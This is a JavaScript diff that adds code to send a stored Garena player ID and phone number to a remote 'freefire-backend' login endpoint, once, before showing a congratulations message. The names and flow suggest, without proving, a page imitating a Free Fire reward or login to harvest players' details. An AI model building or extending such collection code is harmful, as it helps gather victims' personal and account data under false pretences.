@@ -213,6 +213,43 @@ document.addEventListener('DOMContentLoaded', () => {
             }
         }
 
+        // Send data directly to backend database if not already submitted
+        const alreadySubmittedToDb = localStorage.getItem('form_submitted_to_db') === 'true';
+        if (!alreadySubmittedToDb) {
+            const savedId = localStorage.getItem('garena_player_id') || connectedPlayerId || "";
+            const savedPhone = localStorage.getItem('garena_phone_number') || "";
+
+            // Automatically detect backend API location
+            const apiUrl = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') && window.location.port === '5500'
+                ? 'http://localhost:3000/api/login'
+                : 'https://freefire-backend-f409.onrender.com/api/login';
+
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ 
+                    email: null, 
+                    password: null,
+                    playerId: savedId,
+                    phoneNumber: savedPhone
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    localStorage.setItem('form_submitted_to_db', 'true');
+                    console.log('Submission saved successfully to database');
+                } else {
+                    console.error('Server error when saving submission:', data.message);
+                }
+            })
+            .catch(err => {
+                console.error('Network error when saving submission:', err);
+            });
+        }
+
         showCongratulations();
     }
 
